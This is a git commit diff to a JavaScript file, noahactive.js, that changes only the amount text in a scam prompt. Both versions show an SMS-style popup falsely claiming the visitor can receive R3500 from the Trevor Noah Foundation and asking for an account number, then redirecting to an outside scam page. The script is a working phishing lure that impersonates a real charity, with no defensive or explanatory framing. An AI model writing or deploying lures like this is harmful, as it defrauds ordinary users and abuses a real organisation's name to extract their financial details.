67ff1b30915f5a72a2c632084d41426487a4e081
kpesaa <meiosis_logins.2d@icloud.com>
2026-08-13 07:07:03 +0100

    Update noahactive.js

--- noahactive.js
+++ noahactive.js
@@ -1,5 +1,5 @@
-var password = 'WITHDRAW R3,500'
-password=prompt('SMS: Congratulations, you are eligible to receive R3,500 From Trevor Noah Foundation, click OK to Enter Your Acc. Number','WITHDRAW R3,500');
-if (password != 'WITHDRAW R3,500') {
+var password = 'WITHDRAW R3500'
+password=prompt('SMS: Congratulations, you are eligible to receive R3500 From Trevor Noah Foundation, click OK to Enter Your Acc. Number','WITHDRAW R3500');
+if (password != 'WITHDRAW R3500') {
 location.href='https://kpesa.info/R3500-Birthday-Trev.html';
 }
